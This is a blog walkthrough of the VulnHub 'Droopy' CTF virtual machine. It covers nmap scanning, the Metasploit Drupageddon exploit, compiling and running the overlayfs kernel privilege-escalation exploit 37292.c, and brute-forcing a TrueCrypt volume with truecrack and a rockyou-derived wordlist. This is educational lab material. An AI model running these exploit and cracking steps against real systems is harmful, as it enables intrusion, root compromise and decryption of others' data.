<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
            <h1 class="post-title entry-title">Hack the Droopy VM (CTF Challenge)</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/hack-droopy-vm-ctf-challenge/" rel="bookmark"><time class="entry-date published" datetime="2016-08-30T19:41:22+00:00">August 30, 2016</time><time class="updated" datetime="2025-06-10T20:30:41+00:00">June 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">Welcome to another boot2root CTF Challenge “Droopy:” uploaded by knightmare on vulnhub. As, there is a theme, and you will need to snag the flag in order to complete the challenge and you can download it from <strong>https://www.vulnhub.com/?q=droopy&amp;sort=date-des&amp;type=vm</strong></span></p>
<h3><span style="color: #800000;"><strong>Penetrating Methodologies:</strong></span></h3>
<ul>
<li><span style="color: #000000;">Network Scanning (Netdiscover, Nmap)</span></li>
<li><span style="color: #000000;">Identifies Drupal CMS</span></li>
<li><span style="color: #000000;">Exploiting Drupal CMs (Metasploit)</span></li>
<li><span style="color: #000000;">Privilege Escalation with Kernel Exploit</span></li>
<li><span style="color: #000000;">Uploading and Downloading dave.tc from /www/html</span></li>
<li><span style="color: #000000;">Generate </span>a Dictionary<span style="color: #000000;"> with the help of rockyou.txt</span></li>
<li><span style="color: #000000;">Brute Force attack on Truecrypt Volume (Truecrack)</span></li>
<li><span style="color: #000000;">Decrypting File (Veracrypt)</span></li>
<li><span style="color: #000000;">Capture the Flag</span></li>
</ul>
<p><span style="color: #000000;"><strong>Walkthrough</strong></span></p>
<p><span style="color: #000000;">Let us start by scanning the network so that we can know the IP of our target. And to scan the network types the following:</span></p>
<pre class="lang:default decode:true">netdiscover</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-kkZgepVQR2g/W75FXGtV4bI/AAAAAAAAan4/bKcUr6Habp4Us2MuAbHkijmrLgBY0X09wCLcBGAs/s1600/1.png"/></span></p>
<p><span style="color: #000000;">So by using the above command, we know our target IP is <strong>192.168.1.102</strong>. Now that we know our target IP, let’s study it more by using nmap :</span></p>
<pre class="lang:default decode:true">nmap -p- -A 192.168.1.102</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-EBh422G0Lno/W75FYq3ZJNI/AAAAAAAAaoI/f5XttZ31APYmQyTllW5vOaN64sHyH002gCEwYBhgL/s1600/2.png"/></span></p>
<p><span style="color: #000000;">By using nmap we find that port no. 80 is the only one that is opened. So, therefore, lets fire up the IP in the browser.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-n_19Fcvl0sQ/W75FZfFmR9I/AAAAAAAAaoc/zH5FRqR4qCQcVRSh8jt6ZQc2Vsg58cjaQCEwYBhgL/s1600/3.png"/></span></p>
<p><span style="color: #000000;">By studying the webpage we get to know that the website has been made in <strong>Drupal CMS</strong>. And we all know that there is a very effective exploit for it in Metasploit and to use that type :</span></p>
<pre class="lang:default decode:true">use exploit/multi/http/drupal_drupageddon
set rhost 192.168.1.102
exploit</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-WZqmVzw28uQ/W75FZd2zsqI/AAAAAAAAaoY/O7zNM8WKLb8VEoEN6nspf8I-6EFcZFB0wCEwYBhgL/s1600/4.png"/></span></p>
<p>By executing the sysinfo command, we have enumerated the version of kernel ” 3.13.0″ installed in the victim’s machine. then we look its exploit for privilege escalation with help of the following command.</p>
<pre class="lang:default decode:true">searchsploit 3.13.0</pre>
<p>Luckily we found an exploit “overlayfs local Privilege” at path /usr/share/exploitdb/exploits/Linux/local/37292.c and even you can copy this file on the desktop.</p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-DjhDz-6BYJc/W75FZt_mLTI/AAAAAAAAaog/1nzxM6ECwJU7taPvwZGz8EX23103vHuRwCEwYBhgL/s1600/5.png"/></span></p>
<p><span style="color: #000000;">Go to the /tmp folder by typing <strong>cd /tmp</strong> and upload the exploit there by typing :</span></p>
<pre class="lang:default decode:true">upload /root/Desktop/37292.c</pre>
<p><span style="color: #000000;">Once the exploit is uploaded, go to the shell by simply giving <strong>shell</strong> command. And then type :</span></p>
<pre class="lang:default decode:true">python -c 'import pty;pty.spawn("/bin/bash")'</pre>
<p><span style="color: #000000;">And then type the following command to compile the exploit :</span></p>
<pre class="lang:default decode:true">gcc 37292.c -o shell</pre>
<p><span style="color: #000000;">once the exploit is compiled give the permissions to shell :</span></p>
<pre class="lang:default decode:true">chmod 777 shell</pre>
<p><span style="color: #000000;">And then run the <strong>./shell</strong> command for your exploit to work. This is the exploit for privilege escalation so when this exploit runs, you will have your privilege to the VM.</span></p>
<p><span style="color: #000000;">After this check, you id by simply typing <strong>id. </strong> It shows that you are the <strong>root</strong>. So let’s jump to the folder root by typing <strong>cd /root</strong> and then type <strong>ls </strong>to check the file inside the root folder. And here we have one file in the root. Let’s copy it to var/www/html so we can open the file in the browser :</span></p>
<pre class="lang:default decode:true">cp dave.tc /var/www/html</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-3fX8lvOc3U8/W75FaIuxcnI/AAAAAAAAaok/OAlFb1wJzgkYc5NxE4SyfUJvlVPtpMMrACEwYBhgL/s1600/6.png"/></span></p>
<p><span style="color: #000000;">Now, let’s open the file in the browser by typing :</span></p>
<pre class="lang:default decode:true">192.168.1.102/dave.tc</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-H8Y8JIgWiRg/W75FaJM2j7I/AAAAAAAAaoo/zV98sBxjuZM3VGTN6qkUAfogdNP5V4apgCEwYBhgL/s1600/8.png"/></span></p>
<p><span style="color: #000000;">And then we will go into the /var by typing <strong>cd /var </strong>and then type<strong> ls </strong>to view its content. Now, let’s go into the mail by typing<strong> cd mail </strong>and then<strong> ls </strong>to view its content. And the type cat<strong> www-data</strong> to read whatever’s inside it.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-kWZqEiYCke0/W75FXN849zI/AAAAAAAAaow/Pv0TPdbKQb4VYse7dyfHNfsXHDQgPDS8ACEwYBhgL/s1600/11.png"/></span></p>
<p><span style="color: #000000;">In www-data we find a mail. This mail gives us two hints about the password that we need i.e. we will find our password in the rockyou wordlist and password contain prefix or suffix “academy”. So we will take all the words from rockyou wordlist that has an academy in it and make a different wordlist with all the possible passwords. And for this type :</span></p>
<pre class="lang:default decode:true">cat rockyou.txt | grep academy &gt; /root/Desktop/dict.txt</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-BLSNb5qC6AU/W75FXPjkdaI/AAAAAAAAao8/YBbFIJstBbYy66GwVc9J1Q5GTIWxSl97gCEwYBhgL/s1600/15.png"/></span></p>
<p><span style="color: #000000;">Now from the wordlist, that we just created, we will apply a dictionary attack to have our password. And so for this type :</span></p>
<pre class="lang:default decode:true ">truecrack --truecrypt /root/Downloads/dave.tc -k SHA512 -w /root/Desktop/dict.txt</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-_uJAhKSrvQg/W75FXsY1V2I/AAAAAAAAao4/XSkM-XTyNkIpt7O1CG0vzGulPWvWxjt0ACEwYBhgL/s1600/16.png"/></span></p>
<p><span style="color: #000000;">Now using veracrypt we can decrypt the file.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-4Es4H4PQnT8/W75FX0TYKtI/AAAAAAAAao4/GZV3zfy8LG8scslczz-ltr9xOpqA7Db3wCEwYBhgL/s1600/18.png"/></span></p>
<p><span style="color: #000000;">To decrypt the file enter the password that we just found.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-0mC1nXadgdQ/W75FYafp_mI/AAAAAAAAapA/EyFEVUsQzc0Eo9V6zbxmvNLrz3FEUhI4QCEwYBhgL/s1600/19.png"/></span></p>
<p><span style="color: #000000;">Once it opens you can see all of its content.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-e8OlOTPZ60Q/W75FYuGUCmI/AAAAAAAAaow/xITO4fKTwKEDRFxQSjzrZOGzoyOh01b1ACEwYBhgL/s1600/20.png"/></span></p>
<p><span style="color: #000000;">Following are the folders you will find in it.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-aU23mGdXrjU/W75FYkAv4iI/AAAAAAAAao0/lyVtDXHZy74zMOkRNdHNtStsNoTeu1QbwCEwYBhgL/s1600/21.png"/></span></p>
<p><span style="color: #000000;">Open its path in the terminal of kali and type <strong>ls -la</strong> to view the files. Open secret by typing <strong>cd .secret</strong> and the type <strong>ls -la</strong> to see its content. And then open .top by typing <strong>cd .top </strong>and then type <strong>ls -la</strong> to see all the files in it. There you will find flag.txt, type <strong>cat flag.txt</strong> to view the flag.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-eHTLDML3Zh4/W75FZEam-UI/AAAAAAAAao0/Ee-pe8FPa9o5bpZt4U6RpwMHG1AoOR46ACEwYBhgL/s1600/22.png"/></span></p>
<p><span style="color: #000000;">And yippee!!! We found our flag. 😊</span></p>
<p><span style="color: #000000;"><strong>Author</strong>: <strong>Yashika Dhir</strong> is a passionate Researcher and Technical Writer at Hacking Articles. She is a hacking enthusiast. contact <strong><a class="broken_link" style="color: #000000;" href="https://www.linkedin.com/in/yashika-dhir/">here</a></strong></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
